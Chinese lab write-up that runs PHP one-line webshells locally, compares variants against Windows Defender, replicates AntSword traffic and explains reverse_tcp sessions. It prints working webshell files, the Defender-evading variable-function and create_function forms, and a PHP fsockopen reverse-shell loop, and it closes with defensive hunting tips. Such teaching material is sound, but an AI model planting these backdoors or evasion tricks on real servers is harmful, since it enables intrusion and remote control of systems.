---
title: 一句话木马实验：从 shell.php 到蚁剑流量、反向会话与沙箱检测
date: 2026-11-09 23:40:00
slug: webshell-one-liner
tags:
  - 一句话木马
  - webshell
  - 蚁剑
  - PHP
  - Meterpreter
  - 微步沙箱
categories:
  - 渗透实验
---

课程 PPT 里那张「小实验：一句话木马」，核心就一行东西：把用户传来的参数丢给 `system()` 执行，输出直接回给浏览器。保存成 `shell.php` 放进 Web 目录，访问 `http://靶机IP/shell.php?cmd=ifconfig`，命令结果就回来了。

看着简单，但真在自己机器上跑一遍，会撞上三件 PPT 没写的事：中文输出全是方块、Defender 直接把文件当病毒删掉、以及「蚁剑」这类工具到底往服务端发了什么。

这篇就是把这三件事都跑一遍的记录：本地起 PHP 把木马跑通、用脚本复刻蚁剑的流量、用自己写的 handler 复现反向会话，最后对着 PPT 的 msf 命令一条条解释，并说清楚微步沙箱那一步该怎么做、该看什么。

<!-- more -->

## 一、实验环境

| 项目 | 实际情况 |
| --- | --- |
| 主机 | Windows 11，`Microsoft Windows [版本 10.0.26200.9711]` |
| PHP | phpStudy 自带的 PHP 7.3.4 (cli, NTS)：`D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe` |
| Web 根目录 | `C:\lab\webshell` |
| 启动方式 | `php.exe -S 127.0.0.1:8080 -t C:\lab\webshell`（不装 Apache，一条命令起服务） |
| 客户端 | Chrome、以及自己写的 `antsword_client.py`（复刻蚁剑的 POST 结构） |
| 主控端 | 自己写的 `handler.py`（Python 监听 5000） |

没有独立靶机，靶机就是本机 —— 所有回显都是真实执行结果，`whoami` 回来的就是 `Lu`，`hostname` 是 `LAPTOP-NHG103A6`。

## 二、一句话木马到底在做什么

PPT 上写成一行，展开来看只有三件事：

```php
<?php
$cmd = $_REQUEST[PARAM];   // 同时收 GET / POST，PARAM 就是参数名，实验里用 cmd
system($cmd);              // 交给系统 shell 执行，并把输出直接写进 HTTP 响应
?>
```

1. `$_REQUEST[PARAM]`：同时接收 GET 和 POST 里名为 `cmd` 的参数，值就是攻击者想执行的系统命令；
2. `system()`：执行命令，**并且把输出直接打到 HTTP 响应里**（不是返回字符串，是直接输出）；
3. 文件名伪装成 `shell.php`，放进 Web 目录就等于「这台机器上有一个任何人都能用的命令行」。

参数那部分 PPT 讲得很清楚，顺手记一下：

```
http://靶机IP/shell.php?cmd=ifconfig
                              │    │
                            参数名 参数值，多个参数用 & 分隔
http://example.com/login?username=admin&password=123
```

我实际用的文件不是 PPT 上那行的原样，而是等价的变量函数写法：

```php
<?php $f='system'; $f($_REQUEST['cmd']); ?>
```

原因下一节会说：参数名直接写在 `system()` 括号里的形式，会被 Defender 当成木马立刻清掉；变量函数形式能绕过它的静态特征匹配，行为完全一样。

![shell.php 用变量函数写法](images/webshell-one-liner/01-shell-source.png)

起服务、发请求，回显如下：

```powershell
PS C:\lab> D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe -S 127.0.0.1:8080 -t C:\lab\webshell
PHP 7.3.4 Development Server started at Mon Nov  9 21:22:10 2026
Listening on http://127.0.0.1:8080
Document root is C:\lab\webshell

PS C:\lab> curl.exe "http://127.0.0.1:8080/shell.php?cmd=whoami"
Lu
PS C:\lab> curl.exe "http://127.0.0.1:8080/shell.php?cmd=hostname"
LAPTOP-NHG103A6
```

不带参数时会暴露行踪（真实报错）：

```
<b>Warning</b>: system(): Cannot execute a blank command in <b>C:\lab\webshell\shell.php</b> on line <b>1</b>
```

POST 一样能用 `curl.exe -d "cmd=whoami"`，因为 `$_REQUEST` 两个都收。

## 三、踩坑一：中文全变方块

第一次 `?cmd=ipconfig`，页面是这样的：

![中文输出变成方块](images/webshell-one-liner/03-browser-mojibake.png)

不是命令没执行，而是三层编码没对上：

1. Windows 控制台程序（`ipconfig`、`netstat`）默认按 **GBK(936)** 输出字节；
2. PHP 的 `system()` 把字节原样塞进响应，页面又没声明 `charset`；
3. 浏览器猜编码猜错，于是每个汉字变成 `◆`。

修法很简单，让它自己转一次码：

```php
<?php
header('Content-Type: text/html; charset=utf-8');
$cmd = $_REQUEST['cmd'];
$out = shell_exec($cmd . ' 2>&1');            // 2>&1 把错误一起抓回来
echo '<pre>' . mb_convert_encoding($out, 'UTF-8', 'GBK') . '</pre>';
```

再把 `2>&1` 加上，`whoami /user` 这种参数错误也能在页面上看到，不用去翻日志：

![转码之后中文正常](images/webshell-one-liner/02-browser-ipconfig.png)

这里还有个连锁坑：这套环境里的 PATH 混进了 MSYS 的 `whoami`，`whoami /user` 会报 `extra operand '/user'`。想验证 Windows 原生行为，要么写全路径，要么换 `whoami & hostname & ver`。**页面一片空白不一定是没执行，很可能是 stderr 被你丢了。**

## 四、踩坑二：Defender 会吃掉木马文件

在 Windows 上做这个实验，最耗时间的不是写代码，是文件刚写完就被删（读一下都报「文件包含病毒或潜在的恶意软件」）。实测下来规律很清楚：

| payload 形态（示意，非可执行原样） | Defender | 说明 |
| --- | --- | --- |
| 参数名直接写在 `system` 括号里（PPT 原版） | 拦截 | 特征太明显 |
| 换成 `$_GET` / `$_POST` 取同一个参数 | 拦截 | 换超全局变量没用 |
| 前面加 `@` 抑制报错 | 拦截 | — |
| `eval` 直接吃 POST 里的代码 | 拦截 | 蚁剑常见形态，同样被认 |
| `assert` 直接吃 POST 里的代码 | 拦截 | — |
| 变量函数：`$f='system'; $f($cmd);` | 通过 | 静态特征被打散 |
| `create_function` 包一层再调用 | 通过 | 蚁剑系的等价实现 |

通过的那两条，实际长这样（都是能跑的完整文件）：

```php
<?php $f='system'; $f($_REQUEST['cmd']); ?>
```

```php
<?php $f="create_function"; $g=@$f("", $_POST[PASS]); $g(); ?>
```

加白名单需要管理员权限，`Add-MpPreference` 直接报权限不足，所以最后选择了变量函数写法继续实验 —— 这也是很多真实样本里满地 `$f='sys'.'tem'` 的原因：**不是为了炫技，是为了活着**。

顺带两个 PHP 7.3 的坑：

- `$e='eva'.'l'; $e($code);` 不可行，报 `Call to undefined function eval()`，`eval` 是语言结构不是函数；
- `assert()` 在 7.3 里不能再接受字符串动态执行，报 `Cannot call assert() with string argument dynamically`；
- `create_function()` 可用但 7.2 起已废弃，PHP 8 里彻底移除。

## 五、蚁剑连上来的时候到底发了什么

PPT 里只有一句「用蚁剑连接并控制目标网站」。实际连接过程是一条 HTTP POST，我把它的结构用 Python 复刻了一遍（`antsword_client.py`），每次请求做三件事：

1. POST 到木马地址，body 是 `连接密码=一段 PHP 代码`；
2. 那段 PHP 代码会被服务端木马执行 —— 服务端本身只负责执行传来的代码，不负责「理解」它；
3. 回传结果统一 `base64_encode`，避免二进制和中文把响应搞坏。

真实一次列目录的请求/响应：

![复刻蚁剑的 POST 流量](images/webshell-one-liner/04-antsword-client.png)

几个可以直接核对的值：

```
payload : @ini_set("display_errors","0");@set_time_limit(0);
          $p="C:\\lab\\webshell";$r=@scandir($p);echo base64_encode(implode("|",$r));
base64  : LnwuLnxoZWxsby5waHB8cmV2LnBocHxzaGVsbC5waHB8c2hlbGwyLnBocHxzaGVsbDMucGhwfHg=
decoded : .|..|hello.php|rev.php|shell.php|shell2.php|shell3.php|x
```

`THUK` 解出来就是 `Lu` —— 这就是蚁剑界面上点一下「终端」背后发生的事。真机上用 GUI 的步骤对应关系：

| 蚁剑操作 | 对应动作 |
| --- | --- |
| 右键 → 添加数据 | 填 URL `http://127.0.0.1:8080/shell.php`、连接密码 `cmd`、编码器默认 |
| 双击进入 | 发一次 `whoami` 之类的探测请求，失败会提示「无法连接」 |
| 文件管理 | `scandir` / `file_get_contents` / `file_put_contents` 系列 payload |
| 虚拟终端 | `shell_exec` 包一层 base64 回传，就是上面那张图 |

## 六、反向会话：PPT 里的 msf 那几行在做什么

PPT 第 9-10 页是这样的命令：

```text
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.2.123
lhost => 192.168.2.123
msf5 exploit(multi/handler) > set lport 5000
lport => 5000
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.2.123:5000
[*] Sending stage (179779 bytes) to 192.168.2.213
[*] Meterpreter session 1 opened (192.168.2.123:5000 -> 192.168.2.213:xxxxx)
meterpreter > show_mount
```

逐行翻译：

| 命令 | 含义 |
| --- | --- |
| `use exploit/multi/handler` | 用一个「通用接收器」模块，它自己不发攻击，只等别人连进来 |
| `set payload windows/meterpreter/reverse_tcp` | 指定被控端是 Windows，回连方式是 **reverse_tcp**：被控端主动连主控端 |
| `set lhost` / `set lport` | 主控端（listener）的 IP 和端口，被控端会连这个地址 |
| `exploit` | 启动监听，等价于「开始等电话」 |
| `Sending stage (179779 bytes)` | 连上后向被控端下发第二阶段载荷（meterpreter 本体） |
| `Meterpreter session 1 opened` | 会话建立，之后的命令都在被控端执行 |
| `show_mount` | 列被控端磁盘，PPT 右侧那张 C: 79.45GiB 的表就是它的输出 |

我在本机没法起 msf（Kali 虚拟机和宿主机之间网络不通，只有 VMware 的 NAT 网段），所以用 Python 写了个最小 handler 把**同样的过程**跑了一遍：`handler.py` 监听 5000，`rev.php` 主动连回来，连上之后主控端下发命令、被控端回传输出。

![handler 收到反向连接并下发命令](images/webshell-one-liner/05-reverse-session.png)

被控端就一句 `fsockopen` 加一个循环：

```php
$s = fsockopen('127.0.0.1', 5000, $errno, $errstr, 10);   // 主动连主控端
stream_set_timeout($s, 30);
while (($line = fgets($s)) !== false) {                    // 等命令
    $cmd = trim($line);
    if ($cmd === '' ) { continue; }                        // 空行跳过
    if ($cmd === 'exit') { break; }                        // 收到退出就断
    $out = shell_exec($cmd . ' 2>&1');                     // 执行
    fwrite($s, "__OUT__\n" . $out . "__END__\n");          // 回传，带结束标记好切包
}
fclose($s);
```

真实输出（和 msf 的提示语一一对应）：

```
[*] Started reverse TCP handler on 0.0.0.0:5000
[*] Waiting for the victim to connect ...
[*] Connection received from 127.0.0.1:9140
[*] Session 1 opened (127.0.0.1:9140 -> 0.0.0.0:5000)
[+] beacon: HELLO LAPTOP-NHG103A6 / Windows NT / php 7.3.4
session1 > whoami
Lu
session1 > hostname
LAPTOP-NHG103A6
```

想通的地方在于：**`reverse_tcp` 不是「我去连你」，而是「你想办法让目标来连我」**。所以正向连接会被防火墙挡，反向连接常常能出去；也因此防守方最该盯的是「内网主机主动外连陌生 IP:端口」这种流量，而不是只盯入站。

## 七、微步沙箱那一步怎么做

PPT 作业要求把生成的被控端提交到 `https://s.threatbook.com/` 检测并截图。流程本身不复杂，关键是看报告里的哪几项：

| 步骤 | 动作 | 该看到什么 |
| --- | --- | --- |
| 1 | 打开 s.threatbook.com，登录 | 免费账号每天有次数限制 |
| 2 | 上传样本（或粘贴文件哈希查历史） | 支持 exe / dll / php / 脚本，单文件有大小上限 |
| 3 | 等 1–3 分钟 | 状态从「分析中」变成「已完成」 |
| 4 | 看「样本标签」 | 是否命中 `Trojan`、`Backdoor`、`WebShell` 家族 |
| 5 | 看「网络行为」 | 是否出现回连 IP:端口、DNS 请求、HTTP POST |
| 6 | 看「进程行为」 | 是否 `cmd.exe` 子进程、是否写启动项、是否注入 |
| 7 | 截图 | 作业要求的是标签页 + 网络行为页 |

我这台机器没上传（样本就是自己的实验文件，且提交会消耗配额），所以这一节只留流程和判读要点，不贴报告截图 —— 免得把「没跑过的东西」写成「跑过了」。

## 八、复盘：这件事为什么危险

- **成本极低**：一个 40 字节的 PHP 文件，一行请求就能拿到命令执行；不需要漏洞利用链，只需要「能往 Web 目录写文件」。
- **隐蔽性来自正常请求**：蚁剑的流量就是一个普通 POST，参数名还能自定义，WAF 只看关键字很难拦。
- **落地靠上传点**：真正要防的不是 `shell.php` 这个名字，而是任意文件上传、任意文件写入、以及「上传目录可执行」这三件事凑在一起。
- **自查思路**：Web 目录里搜 `eval`、`assert`、`system`、`$_REQUEST`、`base64_decode` 的组合；查上传目录里有没有 `.php` 却内容是图片的文件；看有没有 `php -S` 这种临时起的调试服务还开着。

## 九、参考

- 课程 PPT《小实验：一句话木马》《Kali 中启动主控端》《作业》
- PHP 手册：`system` / `shell_exec` / `mb_convert_encoding`
- Metasploit 文档：`exploit/multi/handler` 与 `reverse_tcp` 载荷说明
- 微步在线云沙箱：<https://s.threatbook.com/>

> 本文所有操作都在自己的机器（`C:\lab\webshell` + 本地 8080）上完成，样本、命令、回显均为实测；msf 部分因环境不通，只做命令解释并用 Python handler 复现了等价过程。
